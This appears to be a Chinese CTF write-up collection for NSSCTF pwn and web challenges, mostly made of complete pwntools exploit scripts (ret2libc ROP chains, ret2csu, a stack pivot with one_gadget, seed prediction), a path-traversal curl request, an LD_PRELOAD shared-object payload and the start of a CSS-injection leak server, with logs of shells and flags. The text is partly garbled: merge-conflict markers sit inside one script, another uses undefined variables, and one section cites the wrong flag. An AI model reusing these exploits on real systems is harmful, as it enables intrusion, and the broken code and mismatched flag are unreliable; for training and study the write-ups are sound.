D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node5.anna.nssctf.cn on port 27962
[x] Opening connection to node5.anna.nssctf.cn on port 27962: Trying 118.195.175.220
[+] Opening connection to node5.anna.nssctf.cn on port 27962: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[*] Switching to interactive mode
cat flag
NSSCTF{3e587670-96ff-474a-864c-85fbbc30a29f}
[*] Got EOF while reading in interactive
```

**得到：NSSCTF{3e587670-96ff-474a-864c-85fbbc30a29f}**



#### 解后思考

##### 举一反三

**如果这题是x86-64该怎么做**

- 最终脚本应该改为

  ```python
  from pwn import *
  
  r = remote("node5.anna.nssctf.cn", 27962)
  elf = ELF("./pwn")
  rop = ROP(elf)
  
  pop_rdi_ret_elf_addr = rop.find_gadget(["pop rdi", "ret"])[0]
  ret_elf_addr = rop.find_gadget(["ret"])[0]
  
  payload = cyclic(0x28 + 0x8)
  payload += p64(pop_rdi_ret_elf_addr) + p64(elf.bss()) + p64(elf.plt["gets"])
  payload += p64(ret_elf_addr)
  payload += p64(pop_rdi_ret_elf_addr) + p64(elf.bss()) + p64(elf.plt["system"])
  r.sendlineafter(b"advise?\n", payload)
  
  r.interactive()
  ```

**如果这题是x86-64且不用gets而用read又该怎么做**

- 最终脚本应该改为

  ```python
  from pwn import *
  
  r = remote("node5.anna.nssctf.cn", 27962)
  elf = ELF("./pwn")
  rop = ROP(elf)
  
  pop_rdi_ret_elf_addr = rop.find_gadget(["pop rdi", "ret"])[0]
  pop_rsi_ret_elf_addr = rop.find_gadget(["pop rsi", "ret"])[0]
  pop_rdx_ret_elf_addr = rop.find_gadget(["pop rdx", "ret"])[0]
  ret_elf_addr = rop.find_gadget(["ret"])[0]
  
  payload = cyclic(0x28 + 0x8)
  payload += p64(pop_rdi_ret_elf_addr) + p64(0) + p64(pop_rsi_ret_elf_addr) + p64(elf.bss()) + p64(pop_rdx_ret_elf_addr) + p64(8) +  p64(elf.plt["read"])
  payload += p64(ret_elf_addr)
  payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(elf.plt["system"])
  r.sendlineafter(b"advise?\n", payload)
  
  r.interactive()
  ```



### [HNCTF 2022 WEEK2]ret2libc

#### 解题过程

**信息搜集**

```shell
file pwn
```

```shell
pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7e15e040148115a47c6690372ac59b714f06a9b5, for GNU/Linux 3.2.0, not stripped
```

```shell
checksec --file=pwn
```

```shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               1               pwn
```

**分析**

- Linux64位小端序
- 没有保护

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  setbuf(_bss_start, 0LL);
  puts("Start Your Input:");
  vuln();
  return 0;
}
```

```c
ssize_t vuln()
{
  _BYTE buf[256]; // [rsp+0h] [rbp-100h] BYREF

  return read(0, buf, 0x200uLL);
}
```

**分析**

- **return read(0, buf, 0x200uLL)存在栈溢出**
- 这题是**ret2libc**可以**公式化做题**
- 先泄露**puts**和**read**的**got表**地址然后减去偏移得到libc的puts和read地址，用这两个地址查找和验证所用的**libc**
- 接着用得到的libc执行**rop**

**最终脚本**

```python
from pwn import *
from LibcSearcher import LibcSearcher

context.os = "linux"
context.arch = "amd64"

r = remote("node5.anna.nssctf.cn", 21149)
elf = ELF("./pwn")
rop = ROP([elf])

pop_rdi_ret_elf_addr = rop.find_gadget(["pop rdi", "ret"])[0]
puts_got_elf_addr = elf.got["puts"]
read_got_elf_addr = elf.got["read"]
ret_elf_addr = rop.find_gadget(["ret"])[0]
puts_plt_elf_addr = elf.plt["puts"]
read_plt_elf_addr = elf.plt["read"]
main_elf_addr = elf.sym["main"]

payload = cyclic(0x100)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(puts_got_elf_addr) + p64(ret_elf_addr) + p64(puts_plt_elf_addr) + p64(main_elf_addr)
r.sendafter(":\n".encode(), payload)
<<<<<<< HEAD
puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
=======
puts_got_libc_addr = u64(r.recv(6).ljust(8, '\x00'.encode()))
>>>>>>> origin/master

payload = cyclic(0x100)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(read_got_elf_addr) + p64(ret_elf_addr) + p64(puts_plt_elf_addr) + p64(main_elf_addr)
r.sendafter(":\n".encode(), payload)
<<<<<<< HEAD
read_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
=======
read_got_libc_addr = u64(r.recv(6).ljust(8, '\x00'.encode()))
>>>>>>> origin/master

libc = LibcSearcher("puts", puts_got_libc_addr)
libc.add_condition("read", read_got_libc_addr)

puts_libc_offset = libc.dump("puts")
libc_base_addr = puts_got_libc_addr - puts_libc_offset

system_libc_addr = libc_base_addr + libc.dump("system")
bin_sh_libc_addr = libc_base_addr + libc.dump("str_bin_sh")

payload = cyclic(0x100)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(bin_sh_libc_addr) + p64(ret_elf_addr) + p64(system_libc_addr)
r.sendafter(":\n".encode(), payload)

r.interactive()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node5.anna.nssctf.cn on port 21149
[x] Opening connection to node5.anna.nssctf.cn on port 21149: Trying 118.195.175.220
[+] Opening connection to node5.anna.nssctf.cn on port 21149: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] Loaded 14 cached gadgets for './pwn'
[+] There are multiple libc that meet current constraints :
0 - libc6_2.31-0ubuntu9.10_amd64
1 - libc6_2.31-0ubuntu9.9_amd64
2 - libc6_2.31-0ubuntu9.8_amd64
3 - libc6_2.31-0ubuntu9.11_amd64
4 - libc6_2.31-0ubuntu9.12_amd64
[+] Choose one : 0
[*] Switching to interactive mode
ls
bin
dev
flag
lib
lib32
lib64
libx32
ret2libc
cat flag
nssctf{L3ak_L1bc_to_g3t_addr3ss_and_ret2_system_b1n5h}
```

<<<<<<< HEAD
**得到：nssctf{L3ak_L1bc_to_g3t_addr3ss_and_ret2_system_b1n5h}**



### [SWPUCTF 2025 秋季新生赛]__libc_csu_init()

#### 题目信息

> [SWPUCTF 2025 秋季新生赛]__libc_csu_init()
>
> 471分
>
> PWN
>
> 
>
> 
>
> 题目描述
>
> strlen可以检查你的payload的长度如果太长是不行的偶，话说，你知道我把你需要的gadget都给你了吗？（在哪里啊？好难猜啊）

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    Stripped:   No
```

**分析**

- Linux64位小端序
- 保护基本没有

**查看源码**

```shell
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init();
  write(1, "Do you know about ret2csu?\n", 0x1BuLL);
  bug();
  return 0;
}
```

```shell
__int64 bug()
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  write(1, "You can try to solve it.\n", 0x19uLL);
  read(0, buf, 0x120uLL);
  if ( strlen(buf) > 0x50 )
  {
    puts("What do you want to do?");
    exit(1);
  }
  write(1, "Did you succeed?\n", 0x11uLL);
  return 0LL;
}
```

**分析**

- **read(0, buf, 0x120uLL)**存在栈溢出
- 用**\x00**绕过**strlen(buf) > 0x50**的长度校验
- 先泄露**libc_base_addr**然后执行**ret2libc**

#### 题目答案

**最终脚本**

```python
from pwn import *
from LibcSearcher import LibcSearcher

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("node6.anna.nssctf.cn", 20013)
# r = process(["./pwn"])

# libc = ELF("./libc.so.6")
elf = ELF("./pwn")
# rop = ROP([elf])

# TODO
# gdb.attach(r)

pop_rdi_ret_elf_addr = 0x4008b3
pop_rsi_pop_r15_ret_elf_addr = 0x4008b1
ret_elf_addr = 0x4005b1

write_got_elf_addr = elf.got["write"]
read_got_elf_addr = elf.got["read"]

write_plt_elf_addr = elf.plt["write"]

main_elf_addr = 0x40081A

payload = cyclic(0x50 - 0x1) + "\x00".encode()
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(0x1) + p64(pop_rsi_pop_r15_ret_elf_addr) + p64(write_got_elf_addr) + p64(0xdeadbeef) + p64(ret_elf_addr) + p64(write_plt_elf_addr) + p64(main_elf_addr)
r.sendafter("it.\n".encode(), payload)

write_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
print("write_got_libc_addr", hex(write_got_libc_addr))

payload = cyclic(0x50 - 0x1) + "\x00".encode()
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(0x1) + p64(pop_rsi_pop_r15_ret_elf_addr) + p64(read_got_elf_addr) + p64(0xdeadbeef) + p64(ret_elf_addr) + p64(write_plt_elf_addr) + p64(main_elf_addr)
r.sendafter("it.\n".encode(), payload)

read_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
print("read_got_libc_addr", hex(read_got_libc_addr))

libc = LibcSearcher("write", write_got_libc_addr)
libc.add_condition("read", read_got_libc_addr)
libc.select_libc(2)

write_libc_offset = libc.dump("write")
libc_base_addr = write_got_libc_addr - write_libc_offset
print("libc_base_addr", hex(libc_base_addr))

system_libc_addr = libc_base_addr + libc.dump("system")
bin_sh_libc_addr = libc_base_addr + libc.dump("str_bin_sh")

payload = cyclic(0x50 - 0x1) + "\x00".encode()
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(bin_sh_libc_addr) + p64(ret_elf_addr) + p64(system_libc_addr)
r.sendafter("it.\n".encode(), payload)
r.interactive()

r.close()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node6.anna.nssctf.cn on port 20013
[x] Opening connection to node6.anna.nssctf.cn on port 20013: Trying 110.42.247.147
[+] Opening connection to node6.anna.nssctf.cn on port 20013: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
write_got_libc_addr 0x7f6064273870
read_got_libc_addr 0x7f60642737d0
libc_base_addr 0x7f606415f000
[*] Switching to interactive mode
Did you succeed?
ls
bin
bug
dev
flag
lib
lib32
lib64
libexec
libx32
cat flag
NSSCTF{a3363476-603c-49da-bce3-1b1c5b9c3e64}
```

**得到：NSSCTF{a3363476-603c-49da-bce3-1b1c5b9c3e64}**



### [LitCTF 2023]狠狠的溢出涅~

#### 题目信息

> [LitCTF 2023]狠狠的溢出涅~
>
> 1分
>
> ret2libc栈溢出栈
>
> 题目描述
>
> 狠狠的溢出涅~
> flag 格式 NSSCTF{}

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'/home/kali/Desktop/ctf/debug'
    Stripped:   No
```

**分析**

- Linux64位小端序
- NX

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[91]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int8 v5; // [rsp+6Bh] [rbp-5h]
  int v6; // [rsp+6Ch] [rbp-4h]

  v6 = 0;
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("Leave your message:");
  read(0, buf, 0x200u);
  v5 = strlen(buf);
  if ( v5 > 0x50u )
  {
    puts("hacker");
    exit(0);
  }
  puts("Ok,Message Received");
  return 0;
}
```

**分析**

- **read(0, buf, 0x200u)**存在栈溢出
- **v5 > 0x50u**需要用**\x00**绕过长度

**数据搜集**

```shell
objdump -d libc.so.6 | grep "system"
```

```shell
0000000000052290 <__libc_system@@GLIBC_PRIVATE>:
   52297:       74 07                   je     522a0 <__libc_system@@GLIBC_PRIVATE+0x10>
0000000000153ae0 <svcerr_systemerr@@GLIBC_2.2.5>:
  153b3b:       75 05                   jne    153b42 <svcerr_systemerr@@GLIBC_2.2.5+0x62>
s
```

```shell
strings -a -t x libc.so.6 | grep "/bin/sh"
```

```shell
1b45bd /bin/sh
```

#### 题目答案

**最终脚本**

```python
from LibcSearcher import LibcSearcher
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("node4.anna.nssctf.cn", 21827)
# r = process(["./pwn"])

elf = ELF("./pwn")
rop = ROP([elf])

# gdb.attach(r)

payload = '\x00'.encode() * (0x60 + 8)
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(elf.sym["main"])
r.sendafter(":\n".encode(), payload)

puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
print("puts_got_libc_addr", hex(puts_got_libc_addr))

payload = '\x00'.encode() * (0x60 + 8)
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(elf.got["read"]) + p64(elf.plt["puts"]) + p64(elf.sym["main"])
r.sendafter(":\n".encode(), payload)

read_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
print("read_got_libc_addr", hex(read_got_libc_addr))

libc = LibcSearcher("puts", puts_got_libc_addr)
libc.add_condition("read", read_got_libc_addr)
libc.select_libc(0)
libc_base_addr = puts_got_libc_addr - libc.dump("puts")
print("libc_base_addr", hex(libc_base_addr))

system_libc_offset = 0x52290
system_libc_addr = libc_base_addr + system_libc_offset
bin_sh_libc_offset = 0x1b45bd
bin_sh_libc_addr = libc_base_addr + bin_sh_libc_offset

payload = '\x00'.encode() * (0x60 + 8)
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(bin_sh_libc_addr) + p64(rop.find_gadget(["ret"])[0]) + p64(system_libc_addr)
r.sendafter(":\n".encode(), payload)

r.interactive()
r.close()
```

```shell
[*] Loaded 15 cached gadgets for './pwn'
puts_got_libc_addr 0x7f03217e3420
read_got_libc_addr 0x7f032186cfc0
libc_base_addr 0x7f032175f000
[*] Switching to interactive mode
Ok,Message Received
$ ls
bin
dev
flag
lib
lib32
lib64
libx32
pwn4
$ cat flag
NSSCTF{u_r_master_of_stackoverflow_and_intoverflow}
```

**得到：NSSCTF{u_r_master_of_stackoverflow_and_intoverflow}**



### [MoeCTF 2022]random

#### 题目信息

> [MoeCTF 2022]random
>
> 321分
>
> PWN随机数
>
> 
>
> 
>
> 题目描述
>
> ubuntu 16.04
> 上帝会掷骰子吗?
> https://github.com/XDSEC/MoeCTF_2022

#### 解题过程

**查看题目**

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v3; // ebx
  int v4; // ebx
  int v5; // eax
  int v7; // [rsp+18h] [rbp-68h] BYREF
  int v8; // [rsp+1Ch] [rbp-64h]
  char s[32]; // [rsp+20h] [rbp-60h] BYREF
  unsigned int seed[2]; // [rsp+40h] [rbp-40h]
  char v11[32]; // [rsp+48h] [rbp-38h] BYREF
  unsigned __int64 v12; // [rsp+68h] [rbp-18h]

  v12 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  *(_QWORD *)seed = time(0);
  memset(s, 0, sizeof(s));
  memset(v11, 0, sizeof(v11));
  printf("username: ");
  read(0, s, 0x20u);
  printf("password: ");
  read(0, v11, 0x20u);
  if ( !strcmp(v11, "ls_4nyth1n9_7ruIy_R4nd0m?") )
  {
    printf("Hello, %s\n", s);
    puts("Let's guest number!");
    srand(seed[0]);
    v3 = rand();
    v4 = rand() ^ v3;
    v5 = rand();
    srand(v4 ^ v5);
    rand();
    rand();
    rand();
    v8 = rand();
    puts("I've got a number in mind.");
    puts("If you guess it right, I'll give what you want.");
    puts("But remember, you have only one chance.");
    puts("Please tell me the number you guess now.");
    __isoc99_scanf("%d", &v7);
    if ( v7 == v8 )
    {
      puts("You did it!");
      puts("Here's your shell");
      system("/bin/sh");
    }
    else
    {
      puts("Emmm, seems you're wrong.");
      puts("Goodbye!");
    }
  }
  else
  {
    puts("Permission denied.");
  }
  return 0;
}
```

**分析**

- 随机数

**最终脚本**

```python
from pwn import *
from ctypes import CDLL

r = remote("node5.anna.nssctf.cn", 24644)

payload = "0xdeadbeef".encode()
r.sendlineafter("username: ".encode(), payload)

payload = "ls_4nyth1n9_7ruIy_R4nd0m?".encode()
r.sendafter("password: ".encode(), payload)

libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
seed = libc.time(0)
libc.srand(seed)

v3 = libc.rand()
v4 = libc.rand() ^ v3
v5 = libc.rand()
libc.srand(v4 ^ v5)

libc.rand()
libc.rand()
libc.rand()
v8 = libc.rand()

r.sendlineafter("Please tell me the number you guess now.\n".encode(), str(v8).encode())

r.interactive()
```

```shell
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ python exp.py
[+] Opening connection to node5.anna.nssctf.cn on port 24644: Done
[*] Switching to interactive mode
You did it!
Here's your shell
$ ls
bin
dev
flag
lib
lib32
lib64
pwn
$ cat flag
NSSCTF{2ffdc393-6696-4949-83bd-adc212107ff3}
```

#### 题目答案

**得到：NSSCTF{2ffdc393-6696-4949-83bd-adc212107ff3}**



## WEB

### [justCTF 2020]gofs

#### 题目信息

> [justCTF 2020]gofs
>
> 
>
> 219分
>
> 目录穿越WEBGolang
>
> 
>
> 
>
> 题目描述
>
> We have implemented a fully featured file server in the Go programming language. Our code is bulletproof!

#### 解题过程

**查看漏洞**

```shell
https://github.com/golang/go/issues/40940
```

#### 题目答案

**最终请求**

```cmd
curl -X CONNECT --path-as-is http://node4.anna.nssctf.cn:28358/0xdeadbeef/../flag
```

```shell
NSSCTF{fb72a9a2-b1e1-4749-99d3-fa35336806d4}


~~~~~~~~~~~~~~ Generated by Go FileServ v0.0.0b ~~~~~~~~~~~~~

(because writing file servers is eeaaassyyyy & fun!!!1111oneone)
```

**得到：NSSCTF{fb72a9a2-b1e1-4749-99d3-fa35336806d4}**



### [GKCTF 2021]Checkin

#### 题目信息

> [GKCTF 2021]Checkin
>
> 
>
> 459分
>
> PWNleave_retROP
>
> 
>
> 
>
> 题目描述
>
> flag以NSSCTF{}形式提交

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

**分析**

- Linux64位小端序
- NX

**查看源码**

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_401815(a1, a2, a3);
  sub_401876();
  return 0;
}
```

```c
__int64 sub_401876()
{
  puts(s);
  puts(a135m_0);
  puts(a135m_1);
  puts(a135m_2);
  puts(a135m_3);
  puts(a135m_4);
  return sub_4018C7();
}
```

```c
int sub_4018C7()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Please Sign-in");
  putchar(62);
  read(0, s1, 0x20u);
  puts("Please input u Pass");
  putchar(62);
  read(0, buf, 0x28u);
  if ( strncmp(s1, "admin", 5u) || (unsigned int)md5_hash(buf) )
  {
    puts("Oh no");
    exit(0);
  }
  puts("Sign-in Success");
  return puts("BaileGeBai");
}
```

**分析**

- 通过逆向，**代码审计**，得到**md5_hash**
- **s1**是一个地址已知的全局变量
- **read(0, buf, 0x28u)**栈溢出了0x8个字节
- 思考一下决定，把rop写到s1上，然后使用**leave; ret;**跳到s1执行rop
- 先泄露**libc_base_addr**，然后通过**one_gadget**来getshell
- 剩下的细节通过**GDB调试**补充

**数据搜集**

```assembly
.text:00000000004018B5                 call    _puts
.text:00000000004018BA                 mov     eax, 0
.text:00000000004018BF                 call    sub_4018C7
.text:00000000004018C4                 nop
.text:00000000004018C5                 leave
.text:00000000004018C6                 retn
```

**分析**

- 用这个**puts**不仅可以回跳到**main**
- 还可以省去很多寄存器造成的未知麻烦

```shell
one_gadget libc.so.6
```

```shell
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

**分析**

- **one_gadget**是一个很重要的工具，新手还是尽量了解一些

**最终脚本**

```python
from pwn import *

r = remote("node4.anna.nssctf.cn", 28759)

# r = process(["./pwn"])
# gdb.attach(r)

libc = ELF("./libc.so.6")
elf = ELF("./pwn")
rop = ROP([elf])

puts_elf_addr = 0x4018B5

s1_elf_addr = 0x602400

one_gadget_libc_offset = [0x4527a, 0xf03a4, 0xf1247]

payload = "admin".encode() + '\x00'.encode() * 0x3
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(elf.got["puts"]) + p64(puts_elf_addr)
r.sendafter("Please Sign-in\n>".encode(), payload)

payload = "admin".encode() + '\x00'.encode() * 0x3 + '\x00'.encode() * (0x20 - 0x8)
payload += p64(s1_elf_addr)
r.sendafter("Please input u Pass\n>".encode(), payload)

puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
libc_base_addr = puts_got_libc_addr - libc.sym["puts"]
print("libc_base_addr", hex(libc_base_addr))

payload = "admin".encode() + '\x00'.encode() * 0x3
payload += p64(0) * 2
payload += p64(libc_base_addr + one_gadget_libc_offset[0])
r.sendafter("Please Sign-in\n>".encode(), payload)

payload = ("admin".encode() + '\x00'.encode() * 0x3) * 2
payload += "admin".encode() + '\x00'.encode() * 0x3
payload += '\x00'.encode() * 0x8
payload += p64(s1_elf_addr)
payload += '\x00'.encode() * 0x8
r.sendafter("Please input u Pass\n>".encode(), payload)

r.interactive()
r.close()
```

```shell
[*] Switching to interactive mode
Sign-in Success
BaileGeBai
$ ls
bin
dev
etc
flag.txt
lib
lib32
lib64
pwn
$ cat flag.txt
flag{checkin}
```

#### 题目答案

**得到：NSSCTF{checkin}**



### [SWPUCTF 2021 新生赛]jicao

#### 题目信息

> [SWPUCTF 2021 新生赛]jicao
>
> 
>
> 1分
>
> PHP代码审计RCE
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看题目**

```php
<?php
highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];
$json=json_decode($_GET['json'],true);
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
?>
```

**分析**

- **POST id=wllmNB**
- **GET json={"x"="wllm"}**

#### 题目答案

```shell
http://node7.anna.nssctf.cn:23688/?json={"x":"wllm"}
POST id=wllmNB
```

```shell
NSSCTF{7d56332b-8f46-48c2-8d47-06bc7432d22c}
```

**得到：nssctf{L3ak_L1bc_to_g3t_addr3ss_and_ret2_system_b1n5h}**



### [UUCTF 2022 新生赛]uploadandinject

#### 题目信息

> [UUCTF 2022 新生赛]uploadandinject
>
> 193分
>
> PHP文件上传WEB
>
> 
>
> 
>
> 题目描述
>
> 你的下一张图片何必是一张图片

#### 解题过程

**查看题目**

```shell
我不会告诉你hint.php里有什么
```

**尝试解题**

```shell
hint.php
```

```shell
nothing here,but I think you look look JPG,index's swp
```

```shell
http://node5.anna.nssctf.cn:21995/.index.php.swp
```

```shell
b0VIM 8.0      ?Qc  ?  root                                    VM-4-6-ubuntu                           /tmp/docker/envinject/index.php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              utf-8
U3210    #"! U                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 tp                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ad  2
  ?            ?  ?  ?  ?  i  B  ;  3  .    ?  ?  ?  ?  ?  ?  ?  k  9    ?  ?  ?  ?  ?  ?  ?  ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ?> }   }     system("echo Failed to load ");   }else{     echo "<br><img src=$img_path>";     system("echo Success to load");     putenv("LD_PRELOAD=/var/www/html/$img_path");   if(file_exists($img_path)){ function loadimg($img_path){ echo "</div>"; loadimg($PATH); echo "<div align='center'>"; }     $PATH="upload/1.jpg"; if((!isset($PATH))){ $PATH=$_GET["image_path"]; EOF; </form> </div>   <input type="submit" value="鍔犺浇">   image_path:<input type="text" name="image_path" value="upload/1.jpg"> <div align="center"> <form action="index.php" method ='GET'> echo <<<EOF <?php 
```

```shell
vin -r index.php.swp
```

```shell
<?php
echo <<<EOF
<form action="index.php" method ='GET'>
<div align="center">
  image_path:<input type="text" name="image_path" value="upload/1.jpg">
  <input type="submit" value="加载">
</div>
</form>
EOF;
$PATH=$_GET["image_path"];
if((!isset($PATH))){
    $PATH="upload/1.jpg";
}
echo "<div align='center'>";
loadimg($PATH);
echo "</div>";
function loadimg($img_path){
  if(file_exists($img_path)){
    putenv("LD_PRELOAD=/var/www/html/$img_path");
    system("echo Success to load");
    echo "<br><img src=$img_path>";
  }else{
    system("echo Failed to load ");
  }
}
?>
```

```cmd
python dirsearch.py -u http://node5.anna.nssctf.cn:21995/ -e *
```

```shell
[19:34:28] 200 -   86B  - /upload/
[19:34:28] 301 -  338B  - /upload  ->  http://node5.anna.nssctf.cn:21995/upload/
[19:34:28] 200 -  277B  - /upload/upload.php
```

**编写脚本**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void payload() {
    //反弹shell
    system("cat /f*");
}

char *strcpy (char *__restrict __dest, const char *__restrict __src) {
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}
```

```shell
gcc -shared -fPIC shell.c -o shell.so
```

```shell
upload/shell.jpg
```

```shell
NSSCTF{e1bde3f3-1531-419c-889d-5edb39b3f667} Success to load
```

#### 题目答案

**得到：NSSCTF{e1bde3f3-1531-419c-889d-5edb39b3f667}**



### [安洵杯 2019]CSS Game

#### 题目信息

> [安洵杯 2019]CSS Game
>
> 479分
>
> WEBCSS注入XSS
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看源码**

```html
<html>
<head>
    <meta charset="utf8" />
    <title>CSS Game</title>
    <style>

    </style>
</head>
<body>
<h1>CSS Game</h1>
<p>
    The flag is in <code>http://127.0.0.1:60000/flag.html</code>
</p>
<p>
    flag.html
    <!--
        <html>
            <link rel="stylesheet" href="${encodeURI(req.query.css)}" />
             <form>
                <input name="Email" type="text" value="test">
                <input name="flag" type="hidden" value="202cb962ac59075b964b07152d234b70"/>
                <input type="submit" value="提交">
            </form>
        </html>
    -->
</p>
<form action="/crawl.html" method="post">
    http://127.0.0.1:60000/flag.html?css=<input type="text" name="css" />
    <input type="submit"/><br><br>
</form>
</body>
</p>
```

**分析**

- **CSS盲注本地文件内容**

- **爆破核心：**

  ```shell
  input[name=flag][value^="待爆破字符串"] ~ * {background-image:url("回显host:port/已知串");}
  ```

**编写盲注脚本**

**app.py**

```python
from flask import Flask, Response, request

app = Flask(__name__)

dic = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-_"
result = ""
BAD_PREFIXES = ["favicon.ico", "robots.txt", "index"]

@app.route('/poc.css')
